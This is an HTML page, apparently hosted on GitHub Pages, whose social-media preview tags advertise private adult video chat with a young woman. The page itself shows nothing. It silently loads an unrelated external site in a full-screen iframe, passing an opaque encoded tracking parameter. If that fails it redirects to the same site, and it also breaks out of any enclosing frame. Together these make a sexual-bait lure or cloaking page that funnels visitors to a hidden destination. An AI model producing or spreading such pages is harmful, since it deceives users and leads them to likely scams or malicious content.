<!DOCTYPE html>
<html lang="zh-CN">
<head>

    <!-- 社交媒体预览 -->
    <meta property="og:title" content="23岁小雅在线等你💕 一对一私密视频聊天">
    <meta property="og:description" content="只进入身体不进入生活 | 高清视频通话 | 私密互动体验 | 仅限成年人">
    <meta property="og:image" content="https://douyin1688.github.io/preview.png">

    <style>
        * { margin: 0; padding: 0; }
        body, html { 
            height: 100%; 
            overflow: hidden; 
            background: #000;
        }
        
        .iframe-container {
            width: 100%;
            height: 100vh;
            position: relative;
        }
        
        iframe { 
            width: 100%; 
            height: 100%; 
            border: none;
            display: block;
        }
        
        /* 加载提示 */
        .loading {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            z-index: 1;
        }
        
        .loading.hidden {
            display: none;
        }
    </style>
</head>
<body>
    <!-- 预览图（隐藏） -->
    <img src="./333.png" alt="预览图" style="display: none; position: absolute; left: -9999px;">
    
    <div class="iframe-container">
        <div class="loading" id="loading">
            <div style="font-size: 20px; margin-bottom: 10px;">🔗</div>
            <div>正在连接...</div>
        </div>
        
        <iframe 
            id="mainFrame"
            src="http://qtjtec.com/template/default/images/index/temp/top.html?d=DxsAHxlTTkIOAkVBCxpPDgMBWgICBwQfSQwaQAVcEwADFkZAWTEMHA0pABsJRlBaUl9FWlpRUVxSW0ZBAh0MAQ%3D%3D"
            onload="hideLoading()"
            onerror="showError()">
        </iframe>
    </div>

    <script>
        function hideLoading() {
            document.getElementById('loading').classList.add('hidden');
        }
        
        function showError() {
            document.getElementById('loading').innerHTML = '<div style="color: #ff6b6b;">连接失败，正在重试...</div>';
            // 如果iframe加载失败，回退到直接跳转
            setTimeout(function() {
                window.location.href = "http://qtjtec.com/template/default/images/index/temp/top.html?d=DxsAHxlTTkIOAkVBCxpPDgMBWgICBwQfSQwaQAVcEwADFkZAWTEMHA0pABsJRlBaUl9FWlpRUVxSW0ZBAh0MAQ%3D%3D";
            }, 2000);
        }
        
        // 防止被嵌套
        if (window.top !== window.self) {
            window.top.location = window.self.location;
        }
    </script>
</body>
</html>
